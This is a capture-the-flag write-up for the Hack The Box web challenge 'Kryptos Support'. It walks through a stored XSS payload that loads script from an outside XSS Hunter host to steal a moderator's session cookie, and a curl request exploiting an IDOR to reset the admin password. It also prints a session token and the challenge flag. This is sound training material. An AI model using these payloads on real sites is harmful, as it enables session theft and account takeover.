# Kryptos Support

## CHALLENGE INFO

> The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?

## Enumeration

Let's have a quick look using `whatweb`. Looks like the backend is running on `Express`.

```
$ whatweb http://134.209.22.191:31923/
http://134.209.22.191:31923/ [200 OK] Country[UNITED STATES][US], IP[134.209.22.191], JQuery, Script[text/javascript], Title[Kryptos Vault], X-Powered-By[Express], X-UA-Compatible[ie=edge]
```

This is the website we are presented with. Looks like a support system.

![](./01.png)

Let's have a look at the source code. This is the javascript that submits support tickets. Not that interesting, but we can see that there's an API endpoint in there.

*http://134.209.22.191:31923/static/js/support.js*
```js
$(document).ready(function() {
	$("#send-btn").on('click', sendTicket);

});

async function sendTicket() {

	$('#send-btn').prop('disabled', true);

	let card = $("#resp-msg");
    card.text('Sending your ticket, please wait');
	card.show();

	let message = $("#message").val();

	if ($.trim(message) === '') {
		$('#send-btn').prop('disabled', false);
		card.text("Please input your message first!");
		card.show();
		return;
	}

	await fetch(`/api/tickets/add`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({message}),
		})
		.then((response) => response.json()
			.then((resp) => {
				card.text(resp.message);
				card.show();
			}))
		.catch((error) => {
			card.text(error);
			card.show();
		});

    $('#send-btn').prop('disabled', false);
}
```

Let's submit a ticket and see what happens. I use the payload `2+2` to check for any templating RCE vulnerabilities.

![](./02.png)

We're told that an admin will review our ticket shortly. The ticket payload is not returned, so no confirmed RCE so far.

Let's click on the `BACKEND` link. This takes us to `/login`. Here's the `login.js` script found on that page:

*http://134.209.22.191:31923/static/js/login.js*

```js
(function($) {
	$.fn.catchEnter = function(sel) {
		return this.each(function() {
			$(this).on('keyup', sel, function(e) {
				if (e.keyCode == 13)
					$(this).trigger("enterkey");
			})
		});
	};
})(jQuery);


$(document).ready(function() {
	$("#login-btn").on('click', auth);
	$("#username").catchEnter().on('enterkey', auth);
	$("#password").catchEnter().on('enterkey', auth);

});

function toggleInputs(state) {
	$("#username").prop("disabled", state);
	$("#password").prop("disabled", state);
	$("#login-btn").prop("disabled", state);
}

async function auth() {

	toggleInputs(true);

	let card = $("#resp-msg");
	card.hide();

	let user = $("#username").val();
	let pass = $("#password").val();

	if ($.trim(user) === '' || $.trim(pass) === '') {
		toggleInputs(false);
		card.text("Please input credentials first!");
		card.show();
		return;
	}

	const data = {
		username: user,
		password: pass
	};

	await fetch(`/api/login`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify(data),
		})
		.then((response) => response.json()
			.then((resp) => {
				if (response.status == 200) {
					card.text(resp.message);
					card.show();
					window.location.href = '/tickets';
					return;
				}
				card.text(resp.message);
				card.show();
			}))
		.catch((error) => {
			card.text(error);
			card.show();
		});

	toggleInputs(false);
}
```

We can see another API endpoint and a successful login would take us to `/tickets`. Let's try some weak usernames and passwords.

![](./03.png)

I had no success after trying some username and password combinations. I also tried some `SQLi` payloads with no result.

## XSS

I don't have a lot of experience with XSS vulnerabilities, but the phrase **"An admin will review your ticket shortly."** triggered an idea. This line is a hint I think. What if we can use a stored XSS payload to steal the admins login session when they browse our ticket?

We can use `https://xsshunter.com/app` to create a payload that will steal the admins cookies for us. Let's try the payload:

```html
"><script src=https://kahari.xss.ht></script>
```

![](./04.png)

When looking at `XSS Payload Fires` on `https://xsshunter.com/app`, we can see that we had a callback!

![](./05.png)

We can take a closer look at the info that was collected by the 
XSS payload:

![](./06.png)

We have a session cookie! Let's add the cookie in our browser:

![](./07.png)

Now let's browse to `/tickets` and see if the login session is valid.

![](./08.png)

We're logged in as `moderator`! Looks promising at first sight, but we don't actually have admin access. The user that triggered the XSS payload was only a moderator. At least we got access to some more parts of the site. Let's look at the "Settings" page. Looks like we can set a new password for the moderator user. Let's give it a go and see what happens:

![](./09.png)

That's interesting! A `uid` field is included in the change password payload. The server already knows which user we're currently logged in as, so this is a bit strange. Could it be that we have an `IDOR` (Insecure direct object reference) vulnerability as well, and that the server trusts the user ID specified by the client instead of the server side ID based on the login session?

We can see that the server response includes the name of the user which had their password changed:

![](./10.png)

Let's copy the change password payload using "Copy as cURL (bash)" and modify the `uid` field. Let's try with `uid = 1`:

```bash
$ curl 'http://134.209.22.191:31923/api/users/update' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9,nb-NO;q=0.8,nb;q=0.7' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI4MTE0MTN9.iZNaLapFiFRpAlSMx-rq1Yt7-y1G9yAXOC4fS1fgVT0' \
  -H 'Origin: http://134.209.22.191:31923' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://134.209.22.191:31923/settings' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36' \
  --data-raw '{"password":"test","uid":"1"}' \
  --compressed \
  --insecure
{"message":"Password for admin changed successfully!"}
```

Success! The server tells us that we successfully changed the password for the `admin` user. Now we can log in using `admin` and `test`:

![](./11.png)

## Flag

`HTB{x55_4nd_id0rs_ar3_fun!!}`
